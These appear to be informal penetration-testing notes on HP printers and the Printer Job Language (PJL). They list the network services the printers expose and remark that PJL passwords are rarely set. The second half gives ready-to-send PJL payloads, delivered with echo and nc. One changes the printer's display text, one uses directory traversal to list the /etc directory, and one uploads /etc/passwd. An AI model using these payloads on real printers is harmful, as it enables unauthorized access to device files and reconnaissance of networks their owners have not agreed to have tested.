PJL - heart of communication with print queues
most printers seldom get updates (wheeeeee)

HP printers have 5 ways of communicating
	HTTP
	HTTPS
	Telnet
	SNMP
	PCL/PJL


HTTP, HTTPS served via embedded web server(EWS)
	any tech that knows what they're doing disables port 80 for port 443

Telnet
	same password as the EWS

SNMP
	snmpwalk?

PJL (printer job language)
	extension of PCL(printer command language)
	PCL is how jobs are communicated to printers
	interesting features
	supports password protection (seperate from EWS an telnet)
		most printers won't have this set
	

test payload (only if printer has display - changes display text to Igor!!!)
	use echo and nc to send
	*[ESC] is replaced with the actual escape character 0x1b

	[ESC]%-12345X @PJL RDYMSG DISPLAY="Igor!!!!"
	[ESC]%-12345X


directory traversal
	This code lists out the contents of the ‘etc’ directory for me:
	[ESC]%-12345X@PJL FSDIRLIST NAME="0:\\..\\..\\..\\etc" ENTRY=1 COUNT=999999
	[ESC]%-12345X
	

This code (the FSUPLOAD command) allowed me to view the contents of the file by sending a print job to the printer.
	[ESC]%-12345X@PJL FSUPLOAD NAME="0:\\..\\..\\..\\etc\passwd" OFFSET=0 SIZE=22000
	[ESC]%-12345X
